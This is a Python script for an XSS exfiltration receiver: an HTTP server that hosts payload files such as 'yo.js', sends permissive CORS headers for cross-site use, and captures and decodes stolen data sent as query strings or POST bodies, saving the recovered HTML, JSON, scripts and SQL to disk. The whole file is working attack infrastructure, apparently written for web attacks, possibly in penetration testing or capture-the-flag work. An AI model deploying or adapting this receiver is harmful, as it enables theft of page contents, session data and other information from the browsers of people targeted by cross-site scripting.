#!/usr/bin/env python3
"""
Universal Exfiltration Data Decoder Server
A flexible HTTP server for decoding and analyzing various encoded payloads.
Maintains file-serving priority for XSS payloads while capturing exfiltration data.
"""

import http.server
import socketserver
import urllib.parse
import base64
import re
import sys
import os
import argparse
import threading
import json
import logging
import hashlib
import binascii
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, List, Tuple, Dict, Any

# --- Configuration ---
class Config:
    def __init__(self, args):
        self.port = args.port
        self.show_content = args.show
        self.json_log = args.json_log
        self.allowed_ips = set(args.allow_ip) if args.allow_ip else None
        self.max_depth = args.max_depth
        self.save_dir = Path(args.output_dir)
        self.log_file = self.save_dir / 'requests.jsonl' if args.json_log else None
        self.quiet = args.quiet
        self.anonymize = args.anonymize
        self.auto_detect = args.auto_detect
        self.min_length = args.min_length

# --- Argument Parsing ---
def parse_args():
    parser = argparse.ArgumentParser(
        description='Universal decoder server for various encoding schemes',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --port 8080 --show
  %(prog)s -p 80 --json-log --anonymize
  %(prog)s --allow-ip 192.168.1.100 10.0.0.5 --quiet
        """
    )
    
    parser.add_argument('--port', '-p', type=int, default=8080, 
                       help='Port to listen on (default: 8080)')
    parser.add_argument('--show', '-s', action='store_true', 
                       help='Print decoded content to console')
    parser.add_argument('--json-log', action='store_true', 
                       help='Enable JSON log output')
    parser.add_argument('--allow-ip', nargs='*', 
                       help='List of allowed IP addresses (whitelist)')
    parser.add_argument('--max-depth', type=int, default=10,
                       help='Maximum recursive decoding depth (default: 10)')
    parser.add_argument('--output-dir', default='decoded_data',
                       help='Output directory (default: decoded_data)')
    parser.add_argument('--quiet', '-q', action='store_true',
                       help='Minimize console output')
    parser.add_argument('--anonymize', '-a', action='store_true',
                       help='Anonymize IP addresses in logs')
    parser.add_argument('--auto-detect', action='store_true',
                       help='Auto-detect content types beyond HTML')
    parser.add_argument('--min-length', type=int, default=5,
                       help='Minimum payload length to process (default: 5)')
    
    return parser.parse_args()

# --- Utility Functions ---
class DataDecoder:
    """Handles various decoding schemes"""
    
    @staticmethod
    def fix_base64_padding(data: str) -> str:
        """Fix Base64 padding"""
        missing = len(data) % 4
        if missing:
            data += '=' * (4 - missing)
        return data

    @staticmethod
    def try_base64_decode(data: str) -> Optional[str]:
        """Attempt Base64 decoding"""
        try:
            # Clean whitespace and fix padding
            cleaned = re.sub(r'\s+', '', data)
            padded = DataDecoder.fix_base64_padding(cleaned)
            decoded = base64.b64decode(padded)
            return decoded.decode('utf-8', errors='replace')
        except Exception:
            return None

    @staticmethod
    def try_hex_decode(data: str) -> Optional[str]:
        """Attempt hex decoding"""
        try:
            # Remove common prefixes and clean
            cleaned = re.sub(r'^(0x|\\x)', '', data, flags=re.IGNORECASE)
            cleaned = re.sub(r'[^0-9a-fA-F]', '', cleaned)
            if len(cleaned) % 2 != 0 or len(cleaned) < 4:
                return None
            decoded = bytes.fromhex(cleaned)
            return decoded.decode('utf-8', errors='replace')
        except Exception:
            return None

    @staticmethod
    def try_unicode_decode(data: str) -> Optional[str]:
        """Attempt Unicode escape decoding"""
        try:
            # Handle various Unicode escape formats
            patterns = [
                (r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16))),
                (r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16))),
                (r'%u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16))),
            ]
            
            result = data
            for pattern, replacement in patterns:
                if re.search(pattern, result):
                    result = re.sub(pattern, replacement, result)
                    return result
            return None
        except Exception:
            return None

    @staticmethod
    def recursive_decode(data: str, max_depth: int = 10) -> Tuple[str, List[Tuple[str, str]]]:
        """Recursively decode data through multiple encoding layers"""
        layers = []
        current = data.strip()
        
        for depth in range(max_depth):
            original = current
            
            # Try URL decoding
            url_decoded = urllib.parse.unquote(current)
            if url_decoded != current and len(url_decoded) >= 4:
                layers.append(('url', url_decoded[:100]))
                current = url_decoded
                continue
            
            # Try Base64 decoding (keep original regex pattern)
            candidate = re.sub(r"\s+", "", current)
            if re.fullmatch(r'[A-Za-z0-9+/]{8,}={0,2}', candidate):
                b64_result = DataDecoder.try_base64_decode(candidate)
                if b64_result and b64_result != current:
                    layers.append(('base64', b64_result[:100]))
                    current = b64_result
                    continue
            
            # Try hex decoding
            hex_result = DataDecoder.try_hex_decode(current)
            if hex_result and hex_result != current:
                layers.append(('hex', hex_result[:100]))
                current = hex_result
                continue
            
            # Try Unicode decoding
            unicode_result = DataDecoder.try_unicode_decode(current)
            if unicode_result and unicode_result != current:
                layers.append(('unicode', unicode_result[:100]))
                current = unicode_result
                continue
            
            # No more decoding possible
            break
        
        return current, layers

class ContentAnalyzer:
    """Analyze and categorize decoded content"""
    
    @staticmethod
    def detect_content_type(content: str) -> str:
        """Detect the type of content"""
        content_lower = content.lower().strip()
        
        # HTML detection
        if any(tag in content_lower for tag in ['<html', '<!doctype', '<head>', '<body>']):
            return 'html'
        
        # XML detection
        if content_lower.startswith('<?xml') or '<root>' in content_lower:
            return 'xml'
        
        # JSON detection
        try:
            json.loads(content)
            return 'json'
        except:
            pass
        
        # JavaScript detection
        if any(keyword in content for keyword in ['function', 'var ', 'let ', 'const ', 'document.']):
            return 'javascript'
        
        # SQL detection
        if any(keyword in content_lower for keyword in ['select ', 'insert ', 'update ', 'delete ', 'union ']):
            return 'sql'
        
        # Base64-like data
        if re.match(r'^[A-Za-z0-9+/=\s]+$', content) and len(content) > 20:
            return 'base64_data'
        
        return 'text'

    @staticmethod
    def get_file_extension(content_type: str) -> str:
        """Get appropriate file extension for content type"""
        extensions = {
            'html': '.html',
            'xml': '.xml',
            'json': '.json',
            'javascript': '.js',
            'sql': '.sql',
            'base64_data': '.b64',
            'text': '.txt'
        }
        return extensions.get(content_type, '.txt')

class LogManager:
    """Handle logging and file operations"""
    
    def __init__(self, config: Config):
        self.config = config
        self.lock = threading.Lock()
        self.base_dir = Path.cwd()
        self.setup_logging()
        self.setup_directories()
    
    def setup_logging(self):
        """Setup logging configuration"""
        level = logging.WARNING if self.config.quiet else logging.INFO
        logging.basicConfig(
            level=level,
            format='[%(levelname)s] %(message)s'
        )
        self.logger = logging.getLogger("xssrecv")
    
    def setup_directories(self):
        """Create necessary directories"""
        self.config.save_dir.mkdir(exist_ok=True)
        (self.config.save_dir / 'raw').mkdir(exist_ok=True)
        (self.config.save_dir / 'decoded').mkdir(exist_ok=True)
    
    def anonymize_ip(self, ip: str) -> str:
        """Anonymize IP address using hash"""
        if not self.config.anonymize:
            return ip
        return hashlib.sha256(ip.encode()).hexdigest()[:12]
    
    def save_content(self, content: str, content_type: str, timestamp: str) -> Optional[str]:
        """Save content to appropriate file"""
        try:
            if content_type == 'html':
                # Keep original HTML naming for compatibility
                filename = f"decoded_{timestamp}.html"
                filepath = self.config.save_dir / filename
            else:
                extension = ContentAnalyzer.get_file_extension(content_type)
                filename = f"decoded_{timestamp}_{content_type}{extension}"
                filepath = self.config.save_dir / 'decoded' / filename
            
            with self.lock, open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.logger.info(f"[+] Saved {content_type.upper()}: {filename}")
            return str(filepath)
        except Exception as e:
            self.logger.warning(f"[!] Error saving {content_type}: {e}")
            return None
    
    def save_raw_data(self, data: str, timestamp: str) -> None:
        """Save raw request data"""
        try:
            filename = f"raw_{timestamp}.txt"
            filepath = self.config.save_dir / filename
            
            with self.lock, open(filepath, 'w', encoding='utf-8') as f:
                f.write(data)
        except Exception as e:
            self.logger.warning(f"Could not save raw data: {e}")
    
    def save_json_log(self, entry: Dict[str, Any]) -> None:
        """Save JSON log entry"""
        if not self.config.json_log:
            return
        
        try:
            with self.lock, open(self.config.log_file, 'a', encoding='utf-8') as f:
                json.dump(entry, f, default=str)
                f.write('\n')
        except Exception as e:
            self.logger.warning(f"Could not write to JSON log: {e}")

class DecodeHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP request handler following original XSS-friendly pattern"""
    
    def __init__(self, *args, config: Config = None, log_manager: LogManager = None, **kwargs):
        self.config = config
        self.log_manager = log_manager
        self.decoder = DataDecoder()
        self.analyzer = ContentAnalyzer()
        super().__init__(*args, **kwargs)
    
    def log_message(self, fmt, *args):
        """Use our custom logger"""
        self.log_manager.logger.info("%s - - [%s] %s", 
                                   self.log_manager.anonymize_ip(self.client_address[0]), 
                                   self.log_date_time_string(), 
                                   fmt % args)
    
    def end_headers(self):
        """Add CORS headers for XSS compatibility"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.end_headers()
    
    def is_allowed_ip(self) -> bool:
        """Check if client IP is allowed"""
        if not self.config.allowed_ips:
            return True
        return self.client_address[0] in self.config.allowed_ips
    
    def handle_data(self, raw_data: str) -> None:
        """Process and decode payload data (following original pattern)"""
        if not self.is_allowed_ip():
            self.log_manager.logger.warning(f"[!] Blocked IP: {self.client_address[0]}")
            return
            
        timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
        
        # Parse key=value format (original pattern)
        key, sep, val = raw_data.partition('=')
        if not sep:
            self.log_manager.logger.warning(f"[!] Bad format: {raw_data}")
            return

        val = urllib.parse.unquote(val)
        self.log_manager.logger.info(f"[+] Raw ({key}): {val[:60]}{'...' if len(val)>60 else ''}")
        
        # Decode recursively
        final, layers = self.decoder.recursive_decode(val, self.config.max_depth)
        
        # Log layers (original format)
        for i, (lt, snippet) in enumerate(layers, 1):
            self.log_manager.logger.info(f"    Layer {i} ({lt}): {snippet[:60]}{'...' if len(snippet)>60 else ''}")
        
        self.log_manager.logger.info(f"[+] Final length: {len(final)} chars")
        self.log_manager.logger.info(f"    Final preview: {final[:20]!r}")

        # Detect content type
        content_type = self.analyzer.detect_content_type(final)
        
        # Create metadata entry
        entry = {
            "timestamp": timestamp,
            "ip": self.log_manager.anonymize_ip(self.client_address[0]),
            "headers": {
                "User-Agent": self.headers.get("User-Agent"),
                "Referer": self.headers.get("Referer")
            },
            "raw": raw_data[:120],
            "decoded_layers": layers,
            "final_preview": final[:120],
            "content_type": content_type
        }

        # Save raw data
        self.log_manager.save_raw_data(raw_data, timestamp)

        # Save content based on type (enhanced from original)
        saved_file = None
        if len(final) >= self.config.min_length:
            if content_type == 'html' or '<html' in final.lower() or '<!doctype' in final.lower():
                # Original HTML handling
                saved_file = self.log_manager.save_content(final, 'html', timestamp)
                entry["saved_html"] = saved_file
                
                if self.config.show_content:
                    print("--- BEGIN DECODED HTML ---")
                    print(final)
                    print("--- END DECODED HTML ---")
            elif self.config.auto_detect and content_type in ['xml', 'json', 'javascript', 'sql']:
                # Enhanced content type handling
                saved_file = self.log_manager.save_content(final, content_type, timestamp)
                entry[f"saved_{content_type}"] = saved_file
                
                if self.config.show_content:
                    print(f"--- BEGIN DECODED {content_type.upper()} ---")
                    print(final)
                    print(f"--- END DECODED {content_type.upper()} ---")
            else:
                self.log_manager.logger.info(f"[!] Content type: {content_type}, skip saving.")
        
        # Save JSON log
        self.log_manager.save_json_log(entry)
    
    def do_GET(self):
        """Handle GET requests - ORIGINAL PATTERN: serve files first, then process data"""
        parsed = urllib.parse.urlsplit(self.path)
        filepath = parsed.path.lstrip('/')
        
        # FIRST: Serve actual files if they exist (CRITICAL for XSS payloads like yo.js)
        if filepath and os.path.isfile(os.path.join(self.log_manager.base_dir, filepath)):
            return super().do_GET()
        
        # SECOND: Log the request
        self.log_manager.logger.info(f"🔍 GET {self.path}")
        
        # THIRD: Process query string as exfiltration data
        if parsed.query:
            self.handle_data(parsed.query)
        
        # FOURTH: Return success response
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')
    
    def do_POST(self):
        """Handle POST requests (enhanced from original)"""
        self.log_manager.logger.info(f"🔍 POST {self.path}")
        
        try:
            length = int(self.headers.get('Content-Length', 0))
            if length > 1024 * 1024:  # 1MB limit
                self.send_error(413, "Payload too large")
                return
                
            body = self.rfile.read(length).decode('utf-8', errors='replace')
            self.log_manager.logger.info(f"    Body: {body[:100]}{'...' if len(body)>100 else ''}")
            
            self.handle_data(body)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Success')
            
        except Exception as e:
            self.log_manager.logger.error(f"[!] POST error: {e}")
            self.send_error(500, "Internal server error")

    def do_HEAD(self):
        """Handle HEAD requests"""
        return self.do_GET()

def create_handler_class(config: Config, log_manager: LogManager):
    """Factory function to create handler with dependencies"""
    class ConfiguredHandler(DecodeHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, config=config, log_manager=log_manager, **kwargs)
    return ConfiguredHandler

def main():
    """Main entry point"""
    args = parse_args()
    config = Config(args)
    log_manager = LogManager(config)
    
    # Original startup info style
    print(f"Working dir: {log_manager.base_dir}")
    print(f"Saving decoded data to: {config.save_dir.absolute()}")
    print(f"Listening on port: {config.port}, show mode: {config.show_content}, json log: {config.json_log}")
    
    if config.allowed_ips:
        print(f"IP whitelist: {', '.join(config.allowed_ips)}")
    if config.anonymize:
        print(f"IP anonymization: enabled")
    
    # Allow immediate socket reuse (from original)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    
    # Configure server
    handler_class = create_handler_class(config, log_manager)
    server = socketserver.ThreadingTCPServer(('0.0.0.0', config.port), handler_class)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log_manager.logger.info("KeyboardInterrupt received, shutting down server...")
    finally:
        server.shutdown()
        server.server_close()
        log_manager.logger.info("Server has exited cleanly.")

if __name__ == '__main__':
    main()
